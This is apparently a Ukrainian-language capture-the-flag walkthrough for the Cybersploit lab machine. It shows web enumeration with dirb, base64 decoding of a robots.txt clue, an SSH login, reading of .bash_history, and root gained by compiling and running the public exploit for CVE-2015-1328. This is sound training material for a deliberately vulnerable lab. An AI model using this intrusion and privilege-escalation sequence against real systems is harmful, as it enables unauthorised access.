# Cybersploit CTF
### 1. Знайти адрес
<img width="668" height="189" alt="image" src="https://github.com/user-attachments/assets/e887bf98-ae7d-4682-abb7-41ed7f6a07e7" />

Бачимо порт 80, перевiряємо, чи там є веб-сторiнка

### 2. Перевiряємо сайт

<img width="870" height="761" alt="image" src="https://github.com/user-attachments/assets/c48b772a-e65a-452a-a3ac-54174532b484" />

Поглянемо на html-код:

<img width="766" height="445" alt="image" src="https://github.com/user-attachments/assets/a4afd292-6f83-440c-84a0-8093ba360df3" />

Бачимо коментар:
"username:CSA"

Добре, логiн вже є

### 3. Шукаємо пароль

Пошукаємо iншi директорiї:
```bash
dirb http://10.22.32.47
````

<img width="461" height="473" alt="image" src="https://github.com/user-attachments/assets/f36f8122-6f54-42e7-b8a0-0aa38ee0968a" />

В robots.txt знаходимо:
```bash
TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg==
````

Виглядає як base64, декодуємо:
```bash
Nice try, but you need more.
Flag1: https://t.me/SoftServeEducation
````

### 4. Спробуємо використати цей флаг як пароль:
```bash
ssh CSA@10.22.32.47
````

<img width="620" height="360" alt="image" src="https://github.com/user-attachments/assets/9f8f06d3-720d-4617-a845-ca7aa799551b" />

Працює!

### 5. Шукаємо флаг
В першу чергу перевiримо iсторiю команд:
```bash
less .bash_history
````

<img width="895" height="653" alt="image" src="https://github.com/user-attachments/assets/15458b4c-8c45-40ee-b14e-8c7049ff2314" />

Маємо другий флаг

### 6. Root
Зосталося тiльки отримати root, використаємо эксплоiт.
Шукаємо версiю системи:
```bash
uname -a
````
```bash
cat /etc/issue
````

Далi, шукаємо експлоiт на exploit-db i знаходимо CVE-2015-1328

Завантажуємо i вiдправляємо на машину:
```bash
scp /home/kali/Downloads/37292.c CSA@10.22.32.47:/home/CSA
````

Компiлюємо:
```bash
gcc 37292.c -o exploit
````

Запускаємо:
```bash
./exploit
````

### 7. Останнiй флаг

<img width="345" height="147" alt="image" src="https://github.com/user-attachments/assets/ec17ba2f-3a51-435b-bcc4-086cada24f92" />

Маємо root!

Глянемо в /root/:

<img width="159" height="67" alt="image" src="https://github.com/user-attachments/assets/040752f9-72d7-4ea1-91d4-1f7a6f0ee0d5" />

```bash
less /root/finalflag.txt
````

<img width="917" height="428" alt="image" src="https://github.com/user-attachments/assets/be7c9eff-4b3e-41ab-a246-38c38088a7bf" />

### Перемога!

<img width="680" height="680" alt="image" src="https://github.com/user-attachments/assets/35d0c4fe-a3d7-48d4-9dbd-299036b80ef0" />
